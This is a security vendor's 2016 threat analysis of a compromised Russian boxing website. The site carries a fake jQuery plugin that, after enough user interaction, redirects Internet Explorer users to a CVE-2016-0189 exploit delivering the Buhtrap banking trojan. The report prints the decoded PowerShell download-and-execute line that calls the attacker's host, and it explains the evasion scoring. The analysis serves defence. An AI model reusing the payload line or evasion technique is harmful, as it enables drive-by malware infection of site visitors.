Highly Evasive Code Injection Awaits User Interaction
Before Delivering Malware

September 28, 2016

On September 27, 2016 Forcepoint Security Labs noticed that the Russian boxing
site allboxing[.]ru was compromised. The site is injected with code that attempts to silently
redirect users to a third party website containing an exploit and a Russian banking trojan.
The injected code employs several evasion tactics, and ensures that the redirect only occurs
when there is significant user interaction on the website.

Hiding in Plain Sight
The site allboxing[.]ru is a very popular Russian boxing website receiving an estimated 3
million visitors per month.

One of the scripts being used by the website at hxxp://allboxing[.]ru/misc/jquery.once.js?
v=1.2 has been modified to include additional code. The code claims to be loading a jQuery
plugin called "jQuery Animate Plugin v1.2" but this is in fact a fake plugin inserted by the
attacker.

1/5

Once of the giveaways here is that the URL reference for the plugin links
to "http://plugins.jquery.com/tag/animate", whereas legitimate plugins will usually reference
the project name directly such as "http://plugins.jquery.com/project/once". Nevertheless, the
attacker has made significant effort to blend in with the legitimate content by using the same
formatting and comment style.
The modified jquery.once.js script loads a second script from /misc/jquery.animate.js which in
turn attempts to insert a script from the attacker's own website. The script is not inserted if
the user's browser is either Chrome or Opera, presumably because the attacker is not able
to exploit these browsers.

The automate.js script on getcanvas[.]org then waits for user interaction before inserting an
iFrame to an exploit.

2/5

The script ensures that sufficient user interaction has occurred from either clicking, scrolling
or moving the mouse. The attacker has given different weighting scores to the different types
of user interaction and will only insert the iFrame once the threshold score is above 30. This
3/5

is a stealth tactic used to prevent automated analysis systems from being redirected to the
exploit. The technique was first documented back in 2014 in a similar infection chain.
Another stealth tactic employed here is the domain name and URL path which has been
used. The term "canvas" is a well known boxing term and the URL contains the
word "sport". This makes the URL appear a lot less suspicious considering
that allboxing[.]ru is a boxing news site.

Exploiting Internet Explorer
The malicious iFrame inserted by the attacker was located
at hxxp://getcanvas[.]org/sport/page/5.html. The page contains a VBScript exploit that
leverages CVE-2016-0189 and attempts to run a Powershell script on the machine.

The Powershell script decodes to the following:
(New-Object
System.Net.WebClient).DownloadFile("http://getcanvas.org/sport/boxing/tysonfury.jpg","
(New-Object -com Shell.Application).ShellExecute("islzma32.exe");

The script downloads and executes tysonfury.jpg which is a variant of the Buhtrap Russian
banking trojan. The SHA1 of the sample we received
is b74f71560e48488d2153ae2fb51207a0ac206e2b.

Protection Statement
Forcepoint™ customers are protected against this threat via TRITON® ACE at the following
stages of attack:

4/5

Stage 2 (Lure) - The fake jQuery plugin is identified and blocked.
Stage 3 (Redirect) - The attempt to insert a malicious iFrame onto the page is blocked.
Stage 4 (Exploit) - The CVE-2016-0189 exploit is identified and blocked.
Stage 5 (Dropper) - The Buhtrap malware is prevented from being downloaded.
Stage 6 (Call Home) - Attempts by the Buhtrap variant to call home are identified and
blocked.

Summary
Attackers are getting better at disguising the code they inject into compromised websites.
Websites with high volumes of traffic are a popular choice for attackers, and this is especially
true if the bulk of the traffic is from a specific region of the world of interest to the attacker.
With the recent arrests of actors using the Lurk banking trojan, Buhtrap appears to be a likely
alternative for actors wishing to target Russian banks and software.
